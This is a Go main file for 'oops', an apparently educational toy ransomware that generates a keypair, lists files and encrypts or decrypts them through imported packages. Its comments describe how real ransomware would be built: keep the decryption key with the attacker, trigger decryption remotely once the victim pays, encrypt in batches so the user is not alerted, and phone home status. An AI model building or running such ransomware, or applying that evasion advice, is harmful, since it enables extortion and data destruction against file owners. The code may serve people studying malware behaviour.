package main

import (
	"flag"
	"fmt"
	"os"

	"github.com/anthonyringoet/oops/crypto"
	"github.com/anthonyringoet/oops/files"
)

var mode string
var dryRun bool

func init() {
	// As this is a toy/fake ransomware, it's fine to use flags.
	// In a realistic scenario, the commands would be baked in,
	// and triggered by a remote server. Eg. the victim payed, so let's start decryption.
	flag.StringVar(&mode, "mode", "encrypt", "Set mode to either 'encrypt' or 'decrypt'.")
	flag.BoolVar(&dryRun, "dryrun", false, "Set to true for dry run.")
	flag.Parse()
}

func main() {
	fmt.Println("Starting oops...")

	// Actual ransomware would probably not generate a keypair :)
	// It should have a key to encrypt baked in or delivered via the network,
	// while the other part of the key stays at the attacker's side.
	// That way, the decryption key is not stored on the victim's machine.
	// It should be possible to deliver that one over the network, at the will of the attacker.
	fmt.Println("Generating keypair")
	crypto.GenerateKeyPair(2048)

	fmt.Println("Getting file list")
	file_list, err := files.GetFileList()
	if err != nil {
		fmt.Fprintf(os.Stderr, "Failed to get file list: %v\n", err)
		os.Exit(1)
	}
	fmt.Printf("Total files: %d\n", len(file_list))

	// Actual ransomware would probably not process all files at once but in batches.
	// You don't want to alert the user that something is going on.
	// Ideally, you can phone home some kind of status as well.
	//
	// @todo: refactor file processor/files.ProcessFile/files.NewStatusTracker
	tracker := files.NewStatusTracker(file_list)
	err = tracker.ProcessFiles(mode, dryRun)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Failed to process files: %v\n", err)
		os.Exit(1)
	}

	fmt.Println(tracker.GetStatus())
}
